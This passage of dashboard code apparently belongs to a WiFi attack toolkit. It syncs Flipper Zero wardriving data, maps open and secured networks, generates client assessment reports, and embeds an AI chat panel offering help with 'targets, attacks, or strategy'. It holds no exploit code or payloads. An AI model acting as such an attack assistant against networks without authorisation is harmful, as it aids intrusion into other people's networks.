                    text.style.color = '#00ff00';
                    portInfo.textContent = result.port || '';
                    portInfo.style.color = '#00ff00';
                    syncBtn.disabled = false;
                    syncBtn.style.opacity = '1';
                    syncBtn.style.cursor = 'pointer';
                } else {
                    dot.style.background = '#ff0000';
                    text.textContent = 'Not connected';
                    text.style.color = '#ff0000';
                    portInfo.textContent = '';
                    syncBtn.disabled = true;
                    syncBtn.style.opacity = '0.4';
                    syncBtn.style.cursor = 'not-allowed';
                }
            } catch (error) {
                dot.style.background = '#333';
                text.textContent = 'Error checking';
                text.style.color = '#888';
                portInfo.textContent = '';
                syncBtn.disabled = true;
                syncBtn.style.opacity = '0.4';
                syncBtn.style.cursor = 'not-allowed';
            }
        }

        async function syncFlipper() {
            const text = document.getElementById('flipperStatusText');
            const syncBtn = document.getElementById('flipperSyncBtn');
            const progress = document.getElementById('flipperSyncProgress');

            text.textContent = 'Syncing...';
            text.style.color = '#ffff00';
            syncBtn.disabled = true;
            syncBtn.style.opacity = '0.4';
            syncBtn.textContent = '‚è≥ Syncing...';
            progress.style.display = 'block';
            progress.textContent = 'Connecting to Flipper...';

            logWardriveSync('üîÑ Starting Flipper sync...');

            try {
                const response = await fetch('/api/flipper/sync', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({})
                });

                const result = await response.json();

                if (result.success) {
                    var msg = '‚úì Sync complete: ' + result.files_synced + ' file(s)';
                    if (result.mapper_errors > 0) {
                        msg += ' (' + result.mapper_errors + ' mapper error' + (result.mapper_errors > 1 ? 's' : '') + ')';
                    }
                    logWardriveSync(msg);
                    progress.textContent = msg;
                    progress.style.color = result.mapper_errors > 0 ? '#ffaa00' : '#00ff00';
                    document.getElementById('lastSyncTime').textContent = 'Last sync: Just now (' + result.files_synced + ' files)';

                    // Refresh stats and map
                    refreshWardriveStats();
                    setTimeout(refreshWardriveMap, 2000);
                    loadSessions();
                } else {
                    logWardriveSync('‚úó Sync failed: ' + result.output);
                    progress.textContent = 'Sync failed';
                    progress.style.color = '#ff4444';
                }

                syncBtn.textContent = 'üîÑ Sync Now';
                checkFlipperStatus();
            } catch (error) {
                logWardriveSync('‚úó Error: ' + error.message);
                progress.textContent = 'Error: ' + error.message;
                progress.style.color = '#ff4444';
                syncBtn.textContent = 'üîÑ Sync Now';
                checkFlipperStatus();
            }
        }
        
        async function refreshWardriveStats() {
            try {
                const response = await fetch('/api/wardrive/stats');
                const stats = await response.json();
                
                document.getElementById('statTotal').textContent = stats.total || 0;
                document.getElementById('statOpen').textContent = stats.open || 0;
                document.getElementById('statSecured').textContent = stats.secured || 0;
                document.getElementById('statSessions').textContent = stats.sessions || 0;
            } catch (error) {
                console.error('Error loading stats:', error);
            }
        }
        
        async function loadSessions() {
            const listEl = document.getElementById('sessionList');

            try {
                const response = await fetch('/api/wardrive/sessions');
                const result = await response.json();

                if (result.sessions && result.sessions.length > 0) {
                    listEl.innerHTML = result.sessions.map(s => {
                        // Format date human-readable
                        var dateStr = s.date;
                        try {
                            var d = new Date(s.date);
                            if (!isNaN(d)) dateStr = d.toLocaleDateString('en-US', {month:'short',day:'numeric'}) + ', ' + d.toLocaleTimeString('en-US', {hour:'numeric',minute:'2-digit'});
                        } catch(e) {}
                        var netInfo = (s.networks || 0) + ' networks';
                        if (s.new_networks) netInfo += ' (' + s.new_networks + ' new)';
                        return '<div style="padding: 8px; margin-bottom: 5px; background: #001a00; border: 1px solid #003300; transition: all 0.2s;" onmouseover="this.style.borderColor=\'#00ff00\'" onmouseout="this.style.borderColor=\'#003300\'">' +
                            '<div style="display:flex; justify-content:space-between; align-items:center;">' +
                                '<span class="session-name" onclick="filterMapBySession(' + s.id + ')" style="color: #00ff00; cursor:pointer; flex:1; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;" title="Click to filter map for this session">' + escapeHtml(s.name) + '</span>' +
                                '<span style="display:flex; gap:4px; flex-shrink:0; margin-left:6px;">' +
                                    '<button onclick="event.stopPropagation(); renameSession(' + s.id + ', this)" style="background:none; border:none; color:#888; cursor:pointer; padding:2px; font-size:12px;" title="Rename this session">‚úèÔ∏è</button>' +
                                    '<button onclick="event.stopPropagation(); deleteSession(' + s.id + ')" style="background:none; border:none; color:#888; cursor:pointer; padding:2px; font-size:12px;" title="Delete this session and its observations">üóëÔ∏è</button>' +
                                '</span>' +
                            '</div>' +
                            '<div onclick="filterMapBySession(' + s.id + ')" style="color: #666; font-size: 10px; cursor:pointer;">' + escapeHtml(dateStr) + ' ¬∑ ' + netInfo + '</div>' +
                        '</div>';
                    }).join('');
                } else {
                    listEl.innerHTML = '<div style="color: #666;">No sessions yet</div>';
                }
            } catch (error) {
                listEl.innerHTML = '<div style="color: #ff0000;">Error loading sessions</div>';
            }
        }

        async function deleteSession(sessionId) {
            if (!confirm('Delete session #' + sessionId + ' and all its observations? Networks will be kept.')) return;
            try {
                const response = await fetch('/api/wardrive/session/' + sessionId, {method: 'DELETE'});
                const result = await response.json();
                if (result.success) {
                    logWardriveSync('üóëÔ∏è Deleted session #' + sessionId + ' (' + result.deleted_observations + ' observations)');
                    loadSessions();
                    refreshWardriveStats();
                } else {
                    logWardriveSync('‚úó Delete failed: ' + result.error);
                }
            } catch (error) {
                logWardriveSync('‚úó Delete error: ' + error.message);
            }
        }

        async function renameSession(sessionId, btn) {
            var row = btn.closest('div[style*="padding: 8px"]');
            var nameEl = row.querySelector('.session-name');
            var oldName = nameEl.textContent;
            var newName = prompt('Rename session:', oldName);
            if (!newName || newName === oldName) return;
            try {
                const response = await fetch('/api/wardrive/session/' + sessionId + '/rename', {
                    method: 'PUT',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({name: newName})
                });
                const result = await response.json();
                if (result.success) {
                    nameEl.textContent = newName;
                    logWardriveSync('‚úèÔ∏è Renamed session #' + sessionId + ' ‚Üí ' + newName);
                } else {
                    logWardriveSync('‚úó Rename failed: ' + result.error);
                }
            } catch (error) {
                logWardriveSync('‚úó Rename error: ' + error.message);
            }
        }
        
        async function filterMapBySession(sessionId) {
            logWardriveSync('üîç Filtering map for session ' + sessionId + '...');

            try {
                const response = await fetch('/api/wardrive/filter', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({session_id: sessionId})
                });
                const result = await response.json();

                if (result.success) {
                    document.getElementById('wardriveMapFrame').src = result.map + '?t=' + Date.now();
                    logWardriveSync('‚úì Showing ' + result.count + ' networks from session ' + sessionId);
                } else {
                    logWardriveSync('‚úó Filter failed: ' + result.error);
                }
            } catch (error) {
                logWardriveSync('‚úó Error: ' + error.message);
            }
        }
        
        function showAllNetworks() {
            document.getElementById('wardriveMapFrame').src = '/wardrive_system/wardrive_master_map.html?t=' + Date.now();
            logWardriveSync('üó∫Ô∏è Showing all networks');
        }
        
        function logWardriveSync(message) {
            const logEl = document.getElementById('wardriveSyncLog');
            const time = new Date().toLocaleTimeString();
            logEl.innerHTML += '[' + time + '] ' + message + '\n';
            logEl.scrollTop = logEl.scrollHeight;
        }

        // ========== REPORT GENERATION FUNCTIONS ==========

        async function showReportModal() {
            document.getElementById('reportModal').style.display = 'flex';
            document.getElementById('reportStatus').textContent = '';

            // Load geofences for dropdown
            try {
                const response = await fetch('/api/wardrive/geofences');
                const result = await response.json();
                const select = document.getElementById('reportGeofence');
                select.innerHTML = '<option value="">All Areas (No Filter)</option>';

                if (result.geofences && result.geofences.length > 0) {
                    result.geofences.forEach(gf => {
                        const opt = document.createElement('option');
                        opt.value = gf.id;
                        opt.textContent = gf.name;
                        select.appendChild(opt);
                    });
                }
            } catch (e) {
                console.error('Error loading geofences:', e);
            }

            // Update stats preview
            updateReportStats();
        }

        function closeReportModal() {
            document.getElementById('reportModal').style.display = 'none';
        }

        async function updateReportStats() {
            const geofenceId = document.getElementById('reportGeofence').value;
            const threshold = document.getElementById('reportVulnThreshold').value;

            try {
                let url = '/api/wardrive/report/stats';
                if (geofenceId) url += '?geofence_id=' + geofenceId;

                const response = await fetch(url);
                const result = await response.json();

                if (result.success) {
                    let count = result.total_networks;
                    if (threshold === 'critical') {
                        count = result.risk_counts.critical || 0;
                    } else if (threshold === 'high') {
                        count = (result.risk_counts.critical || 0) + (result.risk_counts.high || 0);
                    }

                    document.getElementById('reportNetworkCount').textContent = count;
                    document.getElementById('reportCriticalCount').textContent = result.risk_counts.critical || 0;
                    document.getElementById('reportHighCount').textContent = result.risk_counts.high || 0;
                }
            } catch (e) {
                console.error('Error fetching report stats:', e);
            }
        }

        // Update stats when filters change
        document.addEventListener('DOMContentLoaded', function() {
            const geofenceSelect = document.getElementById('reportGeofence');
            const thresholdSelect = document.getElementById('reportVulnThreshold');

            if (geofenceSelect) geofenceSelect.addEventListener('change', updateReportStats);
            if (thresholdSelect) thresholdSelect.addEventListener('change', updateReportStats);
        });

        async function generateReport() {
            const clientName = document.getElementById('reportClientName').value || 'Security Assessment';
            const reportType = document.getElementById('reportType').value;
            const vulnThreshold = document.getElementById('reportVulnThreshold').value;
            const geofenceId = document.getElementById('reportGeofence').value || null;

            const statusEl = document.getElementById('reportStatus');
            const btn = document.getElementById('generateReportBtn');

            statusEl.style.color = '#00aaff';
            statusEl.textContent = 'Generating PDF report...';
            btn.disabled = true;
            btn.style.opacity = '0.5';

            try {
                const response = await fetch('/api/wardrive/report/generate', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        report_type: reportType,
                        client_name: clientName,
                        geofence_id: geofenceId ? parseInt(geofenceId) : null,
                        vuln_threshold: vulnThreshold,
                        include_map: true
                    })
                });

                if (response.ok) {
                    // Download the PDF
                    const blob = await response.blob();
                    const url = window.URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = response.headers.get('Content-Disposition')?.split('filename=')[1] || 'wardrive_report.pdf';
                    document.body.appendChild(a);
                    a.click();
                    a.remove();
                    window.URL.revokeObjectURL(url);

                    statusEl.style.color = '#00ff00';
                    statusEl.textContent = 'Report downloaded!';
                    logWardriveSync('üìÑ Report generated: ' + reportType);
                } else {
                    const error = await response.json();
                    statusEl.style.color = '#ff4444';
                    statusEl.textContent = 'Error: ' + (error.error || 'Unknown error');
                }
            } catch (e) {
                statusEl.style.color = '#ff4444';
                statusEl.textContent = 'Error: ' + e.message;
            } finally {
                btn.disabled = false;
                btn.style.opacity = '1';
            }
        }

        async function previewReport() {
            const clientName = document.getElementById('reportClientName').value || 'Security Assessment';
            const reportType = document.getElementById('reportType').value;
            const vulnThreshold = document.getElementById('reportVulnThreshold').value;
            const geofenceId = document.getElementById('reportGeofence').value || null;

            const statusEl = document.getElementById('reportStatus');
            statusEl.style.color = '#00aaff';
            statusEl.textContent = 'Loading preview...';

            try {
                const response = await fetch('/api/wardrive/report/preview', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        report_type: reportType,
                        client_name: clientName,
                        geofence_id: geofenceId ? parseInt(geofenceId) : null,
                        vuln_threshold: vulnThreshold,
                        include_map: true
                    })
                });

                const result = await response.json();

                if (result.success) {
                    // Open preview in new tab
                    const previewWindow = window.open('', '_blank');
                    previewWindow.document.write(result.html);
                    previewWindow.document.close();

                    statusEl.style.color = '#00ff00';
                    statusEl.textContent = 'Preview opened in new tab';
                } else {
                    statusEl.style.color = '#ff4444';
                    statusEl.textContent = 'Error: ' + (result.error || 'Unknown error');
                }
            } catch (e) {
                statusEl.style.color = '#ff4444';
                statusEl.textContent = 'Error: ' + e.message;
            }
        }

        // ========== END REPORT FUNCTIONS ==========

        // Initialize wardriving page
        function initWardriving() {
            checkFlipperStatus();
            refreshWardriveStats();
            loadSessions();
            refreshReportRiskCounts();
            // Auto-refresh map iframe so overlays load properly
            refreshWardriveMap();
            // Immediately check if a scan is running (e.g. started from phone)
            syncScanState();
        }

        // Fetch risk counts for the main panel (not the modal)
        async function refreshReportRiskCounts() {
            try {
                const response = await fetch('/api/wardrive/report/stats');
                const result = await response.json();
                if (result.success) {
                    document.getElementById('reportCriticalCount').textContent = result.risk_counts.critical || 0;
                    document.getElementById('reportHighCount').textContent = result.risk_counts.high || 0;
                } else {
                    // API error - show 0 instead of leaving as "-"
                    document.getElementById('reportCriticalCount').textContent = '0';
                    document.getElementById('reportHighCount').textContent = '0';
                }
            } catch (e) {
                console.error('Error fetching risk counts:', e);
                // Network/parse error - show 0 instead of leaving as "-"
                document.getElementById('reportCriticalCount').textContent = '0';
                document.getElementById('reportHighCount').textContent = '0';
            }
        }

        // Check Flipper status periodically
        setInterval(checkFlipperStatus, 10000);

        // Battery indicator
        async function updateBatteryIndicator() {
            var el = document.getElementById('batteryIndicator');
            if (!el) return;
            try {
                var resp = await fetch('/api/system/battery');
                var bat = await resp.json();
                if (bat.percent < 0) { el.textContent = '--'; return; }
                var icon = bat.percent <= 15 ? '\uD83E\uDEAB' : '\uD83D\uDD0B';
                var pct = bat.percent + '%';
                if (bat.plugged_in) pct += '\u26A1';
                el.textContent = icon + ' ' + pct;
                if (bat.percent <= 20) {
                    el.style.color = '#ff4444';
                    el.style.borderColor = '#ff4444';
                } else if (bat.percent <= 40) {
                    el.style.color = '#ffaa00';
                    el.style.borderColor = '#555';
                } else {
                    el.style.color = '#00ff00';
                    el.style.borderColor = '#333';
                }
                el.title = 'Battery: ' + bat.percent + '% ' + (bat.plugged_in ? '(Charging)' : '(' + bat.status + ')');
            } catch (e) {
                el.textContent = '--';
                el.style.color = '#888';
            }
        }
        updateBatteryIndicator();
        setInterval(updateBatteryIndicator, 60000);

        // ========== END WARDRIVING FUNCTIONS ==========


</script>
<!-- J4Rv15 Chat Panel -->
<div id="operatorPanel" style="
    position: fixed;
    bottom: 20px;
    right: 20px;
    width: 400px;
    height: 500px;
    background: #0a0a0a;
    border: 2px solid #00ff00;
    border-radius: 10px;
    display: none;
    flex-direction: column;
    z-index: 9999;
    box-shadow: 0 0 20px rgba(0,255,0,0.3);
">
    <!-- Header -->
    <div style="
        background: linear-gradient(90deg, #001100, #002200);
        padding: 10px 15px;
        border-bottom: 1px solid #00ff00;
        display: flex;
        justify-content: space-between;
        align-items: center;
        border-radius: 8px 8px 0 0;
    ">
        <span style="color: #00ff00; font-weight: bold;">ü§ñ J4Rv15</span>
        <div>
            <button onclick="clearOperator()" style="background: #333; border: 1px solid #555; color: #888; padding: 3px 8px; cursor: pointer; margin-right: 5px;" title="Clear conversation history">Clear</button>
            <button onclick="toggleOperator()" style="background: #333; border: 1px solid #555; color: #0f0; padding: 3px 8px; cursor: pointer;" title="Minimize chat panel">‚àí</button>
        </div>
    </div>
    
    <!-- Messages -->
    <div id="operatorMessages" style="
        flex: 1;
        overflow-y: auto;
        padding: 10px;
        font-size: 13px;
        line-height: 1.4;
    ">
        <div style="color: #666; text-align: center; padding: 20px;">
            I can see everything happening in Arsenal.<br>
            Ask me anything about your targets, attacks, or strategy.
        </div>
    </div>
    
    <!-- Input -->
    <div style="padding: 10px; border-top: 1px solid #333;">
        <div style="display: flex; gap: 5px;">
            <input type="text" id="operatorInput" placeholder="Ask J4Rv15..." 
                onkeypress="if(event.key==='Enter')sendToOperatorFloat()"
                style="
                    flex: 1;
                    background: #111;
                    border: 1px solid #333;
                    color: #0f0;
                    padding: 10px;
                    font-family: monospace;
                " title="Type your message and press Enter to send">
            <button id="floatSendBtn" onclick="sendToOperatorFloat()" style="
                background: #004400;
                border: 1px solid #006600;
                color: #0f0;
                padding: 10px 15px;
                cursor: pointer;
            " title="Send message to J4Rv15">Send</button>
            <button id="floatStopBtn" onclick="stopOperatorResponse()" style="
                display: none;
                background: #880000;
                border: 1px solid #aa0000;
                color: #fff;
                padding: 10px 15px;
                cursor: pointer;
            " title="Stop the response">‚èπ</button>
        </div>
    </div>
</div>

<!-- Operator Toggle Button -->
<button id="operatorToggle" onclick="toggleOperator()" style="
    position: fixed;
    bottom: 20px;
    right: 20px;
    width: 60px;
    height: 60px;
    border-radius: 50%;
    background: linear-gradient(135deg, #002200, #004400);
    border: 2px solid #00ff00;
    color: #00ff00;
    font-size: 24px;
    cursor: pointer;
    z-index: 9998;
    box-shadow: 0 0 15px rgba(0,255,0,0.4);
" title="Open J4Rv15 - AI assistant with full system context">ü§ñ</button>

<script>
// Operator Chat Functions
let operatorVisible = false;

function toggleOperator() {
    operatorVisible = !operatorVisible;
    document.getElementById('operatorPanel').style.display = operatorVisible ? 'flex' : 'none';
    document.getElementById('operatorToggle').style.display = operatorVisible ? 'none' : 'block';
    if (operatorVisible) {
        document.getElementById('operatorInput').focus();
        checkOperatorStatus();
    }
}

async function checkOperatorStatus() {
    try {
        const response = await fetch('/api/operator/status');
        const status = await response.json();
        if (!status.configured) {
            addOperatorMessage('system', '‚ö†Ô∏è No API key configured. Create /home/ov3rr1d3/wifi_arsenal/.anthropic_key with your key.');
        }
    } catch (error) {
        addOperatorMessage('system', '‚ö†Ô∏è Could not check status: ' + error);
    }
}

async function sendToOperatorFloat() {
    const input = document.getElementById('operatorInput');
    const message = input.value.trim();
    if (!message) return;
    
    input.value = '';
    
    // Show stop button, hide send
    document.getElementById('floatSendBtn').style.display = 'none';
    document.getElementById('floatStopBtn').style.display = 'inline-block';
    
    // Use shared abort controller
    operatorAbortController = new AbortController();
    
    addOperatorMessage('user', message);
    
    // Create streaming response container for floating panel
    const floatStreamDiv = document.createElement('div');
    floatStreamDiv.style.marginBottom = '10px';
    floatStreamDiv.style.padding = '8px 12px';
    floatStreamDiv.style.borderRadius = '8px';
    floatStreamDiv.style.background = '#111';
    floatStreamDiv.style.color = '#00cc00';
    floatStreamDiv.style.marginRight = '20px';
    floatStreamDiv.style.borderLeft = '3px solid #00ff00';
    floatStreamDiv.innerHTML = '<span style="color: #666;">ü§î Thinking...</span>';
    document.getElementById('operatorMessages').appendChild(floatStreamDiv);
    
    // Also add to main page if it exists
    const mainMessages = document.getElementById('operatorMainMessages');
    let mainStreamDiv = null;
    if (mainMessages) {
        addOperatorMessageMain('user', message);
        mainStreamDiv = document.createElement('div');
        mainStreamDiv.style.marginBottom = '15px';
        mainStreamDiv.style.padding = '12px 16px';
        mainStreamDiv.style.borderRadius = '8px';
        mainStreamDiv.style.background = '#1a1a1a';
        mainStreamDiv.style.color = '#00cc00';
        mainStreamDiv.style.marginRight = 'auto';
        mainStreamDiv.style.maxWidth = '85%';
        mainStreamDiv.style.borderLeft = '3px solid #00ff00';
        mainStreamDiv.innerHTML = floatStreamDiv.innerHTML;
        mainMessages.appendChild(mainStreamDiv);
    }
    
    let fullResponse = '';
    let toolCount = 0;
    
    try {
        const response = await fetch('/api/operator/chat/stream', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ message: message }),
            signal: operatorAbortController.signal
        });
        
        // Check if response is OK
        if (!response.ok) {
            const errorData = await response.json().catch(() => ({ error: 'Unknown error' }));
            streamDiv.innerHTML = '<span style="color: #ff6666;">‚ö†Ô∏è Error: ' + (errorData.error || response.statusText) + '</span>';
            floatStreamDiv.innerHTML = streamDiv.innerHTML;
            resetOperatorButtons();
            return;
        }
        
        const reader = response.body.getReader();
        const decoder = new TextDecoder();
        let buffer = '';
        
        while (true) {
            const {done, value} = await reader.read();
            if (done) break;
            
            buffer += decoder.decode(value, {stream: true});
            const lines = buffer.split('\n');
            buffer = lines.pop();
            
            for (const line of lines) {
                if (line.startsWith('data: ')) {
                    try {
                        const data = JSON.parse(line.slice(6));
                        
                        switch (data.type) {
                            case 'status':
                                if (data.status === 'thinking') {
                                    floatStreamDiv.innerHTML = '<span style="color: #666;">ü§î Thinking...</span>';
                                    if (mainStreamDiv) mainStreamDiv.innerHTML = floatStreamDiv.innerHTML;
                                }
                                break;
                            
                            case 'text_start':
                                floatStreamDiv.innerHTML = '';
                                if (mainStreamDiv) mainStreamDiv.innerHTML = '';
                                fullResponse = '';
                                break;
                            
                            case 'text_delta':
                                fullResponse += data.text;
                                floatStreamDiv.innerHTML = formatOperatorResponse(fullResponse);
                                if (mainStreamDiv) mainStreamDiv.innerHTML = formatOperatorResponse(fullResponse);
                                document.getElementById('operatorMessages').scrollTop = 
                                    document.getElementById('operatorMessages').scrollHeight;
                                break;
                            
                            case 'tool_start':
                                toolCount++;
                                floatStreamDiv.innerHTML = formatOperatorResponse(fullResponse) + 
                                    '<div style="color: #ffcc00; font-size: 11px; margin-top: 5px;">üîß ' + data.tool + '...</div>';
                                if (mainStreamDiv) mainStreamDiv.innerHTML = floatStreamDiv.innerHTML;
                                break;
                            
                            case 'tool_executing':
                                floatStreamDiv.innerHTML = formatOperatorResponse(fullResponse) + 
                                    '<div style="color: #ffcc00; font-size: 11px; margin-top: 5px;">‚ö° ' + data.tool + '...</div>';
                                if (mainStreamDiv) mainStreamDiv.innerHTML = floatStreamDiv.innerHTML;
                                break;
                            
                            case 'tool_result':
                                floatStreamDiv.innerHTML = formatOperatorResponse(fullResponse) + 
                                    '<div style="color: #00ff00; font-size: 11px; margin-top: 5px;">‚úì ' + data.tool + '</div>';
                                if (mainStreamDiv) mainStreamDiv.innerHTML = floatStreamDiv.innerHTML;
                                break;
                            
                            case 'done':
                                floatStreamDiv.innerHTML = formatOperatorResponse(data.full_response);
                                if (mainStreamDiv) mainStreamDiv.innerHTML = formatOperatorResponse(data.full_response);
                                loadConversations(); // Refresh list for name update
                                break;
                            
                            case 'error':
                                floatStreamDiv.innerHTML = '<span style="color: #ff6666;">‚ö†Ô∏è ' + data.error + '</span>';
                                if (mainStreamDiv) mainStreamDiv.innerHTML = floatStreamDiv.innerHTML;
                                break;
                        }
                    } catch (e) {
                        console.error('Failed to parse SSE:', e);
                    }
                }
            }
        }
        
        resetFloatButtons();
        
    } catch (error) {
        if (error.name === 'AbortError') {
            floatStreamDiv.innerHTML = formatOperatorResponse(fullResponse) + 
                '<div style="color: #ff6666; margin-top: 5px;">‚èπ Stopped</div>';
            if (mainStreamDiv) mainStreamDiv.innerHTML = floatStreamDiv.innerHTML;
        } else {
            floatStreamDiv.innerHTML = '<span style="color: #ff6666;">‚ö†Ô∏è ' + error + '</span>';
            if (mainStreamDiv) mainStreamDiv.innerHTML = floatStreamDiv.innerHTML;
        }
        resetFloatButtons();
    }
}

function resetFloatButtons() {
    const sendBtn = document.getElementById('floatSendBtn');
    const stopBtn = document.getElementById('floatStopBtn');
    if (sendBtn) sendBtn.style.display = 'inline-block';
    if (stopBtn) stopBtn.style.display = 'none';
    operatorAbortController = null;
}

function addOperatorMessage(role, content) {
    const messages = document.getElementById('operatorMessages');
    const div = document.createElement('div');
    div.style.marginBottom = '10px';
    div.style.padding = '8px 12px';
    div.style.borderRadius = '8px';
    
    if (role === 'user') {
        div.style.background = '#002200';
        div.style.color = '#00ff00';
        div.style.marginLeft = '20px';
        div.innerHTML = '<strong>You:</strong> ' + escapeHtml(content);
    } else if (role === 'assistant') {
        div.style.background = '#111';
        div.style.color = '#00cc00';
        div.style.marginRight = '20px';
        div.style.borderLeft = '3px solid #00ff00';
        div.innerHTML = formatOperatorResponse(content);
    } else {
        div.style.background = '#221100';
        div.style.color = '#ffaa00';
        div.style.textAlign = 'center';
        div.innerHTML = content;
    }
    
    messages.appendChild(div);
    messages.scrollTop = messages.scrollHeight;
}

function formatOperatorResponse(text) {
    // Convert markdown-style code blocks
    text = text.replace(/```([\s\S]*?)```/g, '<pre style="background:#000;padding:5px;overflow-x:auto;font-size:11px;">$1</pre>');
    // Convert inline code
    text = text.replace(/`([^`]+)`/g, '<code style="background:#000;padding:2px 4px;">$1</code>');
    // Convert bold
    text = text.replace(/\*\*([^*]+)\*\*/g, '<strong>$1</strong>');
    // Convert newlines
    text = text.replace(/\n/g, '<br>');
    return text;
}

function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

async function clearOperator() {
    try {
        await fetch('/api/operator/clear', { method: 'POST' });
        document.getElementById('operatorMessages').innerHTML = '<div style="color: #666; text-align: center; padding: 20px;">Conversation cleared. How can I help?</div>';
        // Also clear main page
        const mainMessages = document.getElementById('operatorMainMessages');
        if (mainMessages) {
            mainMessages.innerHTML = '<div style="color: #666; text-align: center; padding: 40px;"><div style="font-size: 48px; margin-bottom: 20px;">ü§ñ</div><div style="font-size: 16px; color: #0f0; margin-bottom: 10px;">J4Rv15</div><div style="font-size: 13px;">Conversation cleared. How can I help?</div></div>';
        }
    } catch (error) {
        addOperatorMessage('system', '‚ö†Ô∏è Could not clear: ' + error);
    }
}

// ========== OPERATOR PAGE FUNCTIONS ==========

// Tab switching
// Operator mode toggle (work/chat)
let operatorMode = 'work';

async function toggleOperatorMode() {
    const newMode = operatorMode === 'work' ? 'chat' : 'work';
    try {
        const response = await fetch('/api/operator/mode', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({mode: newMode})
        });
        const data = await response.json();
        if (data.success) {
            operatorMode = data.mode;
            updateModeButton();
        }
    } catch (e) {
        console.error('Mode toggle error:', e);
    }
}

function updateModeButton() {
    const btn = document.getElementById('modeToggleBtn');
    if (btn) {
        if (operatorMode === 'work') {
            btn.innerHTML = 'üîß Work Mode';
            btn.style.background = 'linear-gradient(180deg, #002200, #001100)';
            btn.style.borderColor = '#004400';
            btn.title = 'Work Mode: All tools available. Click to switch to Chat Mode.';
        } else {
            btn.innerHTML = 'üí¨ Chat Mode';
            btn.style.background = 'linear-gradient(180deg, #000022, #000011)';
            btn.style.borderColor = '#000044';
            btn.title = 'Chat Mode: Conversation focused, minimal tools. Click to switch to Work Mode.';
        }
    }
}

// Load current mode on page init
async function loadOperatorMode() {
    try {
        const response = await fetch('/api/operator/mode');
        const data = await response.json();
        operatorMode = data.mode || 'work';
        updateModeButton();
    } catch (e) {
        console.error('Load mode error:', e);
    }
}

function showOperatorTab(tab) {
    // Update tab buttons
    document.querySelectorAll('.op-tab').forEach(btn => {
        btn.style.background = '#0a0a0a';
        btn.style.color = '#666';
    });
    document.getElementById('opTab' + tab.charAt(0).toUpperCase() + tab.slice(1)).style.background = '#111';
    document.getElementById('opTab' + tab.charAt(0).toUpperCase() + tab.slice(1)).style.color = '#0f0';
    
    // Show/hide panels
    document.getElementById('opPanelConversations').style.display = tab === 'chat' ? 'block' : 'none';
    document.getElementById('opPanelMemory').style.display = tab === 'memory' ? 'block' : 'none';
    document.getElementById('opPanelSettings').style.display = tab === 'settings' ? 'block' : 'none';
    
    // Load data for tab
    if (tab === 'settings') {
        loadFacts();
        loadTools();
    }
}

// Operator request state
let operatorAbortController = null;
let operatorThinkingInterval = null;

// Send from main Operator page with STREAMING
async function sendToOperatorMain() {
    const input = document.getElementById('operatorMainInput');
    const message = input.value.trim();
    if (!message) return;
    
    input.value = '';
    
    // Show stop button, hide send
    document.getElementById('operatorSendBtn').style.display = 'none';
    document.getElementById('operatorStopBtn').style.display = 'inline-block';
    
    // Create abort controller
    operatorAbortController = new AbortController();
    
    // Add user message to both UIs
    addOperatorMessageMain('user', message);
    addOperatorMessage('user', message);
    
    // Create streaming response container
    const streamDiv = document.createElement('div');
    streamDiv.style.marginBottom = '15px';
    streamDiv.style.padding = '12px 16px';
    streamDiv.style.borderRadius = '8px';
    streamDiv.style.background = '#1a1a1a';
    streamDiv.style.color = '#00cc00';
    streamDiv.style.marginRight = 'auto';
    streamDiv.style.maxWidth = '85%';
    streamDiv.style.borderLeft = '3px solid #00ff00';
    streamDiv.innerHTML = '<span style="color: #666;">ü§î Thinking...</span>';
    document.getElementById('operatorMainMessages').appendChild(streamDiv);
    
    // Also add to floating panel
    const floatStreamDiv = document.createElement('div');
    floatStreamDiv.style.cssText = streamDiv.style.cssText;
    floatStreamDiv.innerHTML = streamDiv.innerHTML;
    document.getElementById('operatorMessages').appendChild(floatStreamDiv);
    
    // Show tool activity panel
    document.getElementById('toolActivityPanel').style.display = 'block';
    document.getElementById('toolActivityLog').innerHTML = '';
    
    let fullResponse = '';
    let toolCount = 0;
    
    try {
        const response = await fetch('/api/operator/chat/stream', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ message: message }),
            signal: operatorAbortController.signal
        });
        
        // Check if response is OK
        if (!response.ok) {
            const errorData = await response.json().catch(() => ({ error: 'Unknown error' }));
            streamDiv.innerHTML = '<span style="color: #ff6666;">‚ö†Ô∏è Error: ' + (errorData.error || response.statusText) + '</span>';
            floatStreamDiv.innerHTML = streamDiv.innerHTML;
            resetOperatorButtons();
            return;
        }
        
        const reader = response.body.getReader();
        const decoder = new TextDecoder();
        let buffer = '';
        
        while (true) {
            const {done, value} = await reader.read();
            console.log('Stream read:', done, value ? value.length + ' bytes' : 'null');
            if (done) break;
            
            buffer += decoder.decode(value, {stream: true});
            console.log('Buffer:', buffer.substring(0, 100));
            const lines = buffer.split('\n');
            buffer = lines.pop(); // Keep incomplete line in buffer
            
            for (const line of lines) {
                console.log('Processing line:', line.substring(0, 80));
                if (line.startsWith('data: ')) {
                    try {
                        const data = JSON.parse(line.slice(6));
                        console.log('Parsed event:', data.type);
                        
                        switch (data.type) {
                            case 'status':
                                if (data.status === 'thinking') {
                                    // Don't replace text - show status alongside
                                    const statusHtml = '<div class="thinking-status" style="color: #666; font-size: 11px; margin-top: 5px;">ü§î Thinking (iteration ' + data.iteration + ')...</div>';
                                    if (fullResponse) {
                                        streamDiv.innerHTML = formatOperatorResponse(fullResponse) + statusHtml;
                                        floatStreamDiv.innerHTML = streamDiv.innerHTML;
                                    } else {
                                        streamDiv.innerHTML = statusHtml;
                                        floatStreamDiv.innerHTML = statusHtml;
                                    }
                                }
                                break;
                            
                            case 'text_start':
                                // Only clear if this is the first text block (iteration 1)
                                // Don't clear between tool iterations
                                if (!fullResponse) {
                                    streamDiv.innerHTML = '';
                                    floatStreamDiv.innerHTML = '';
                                }
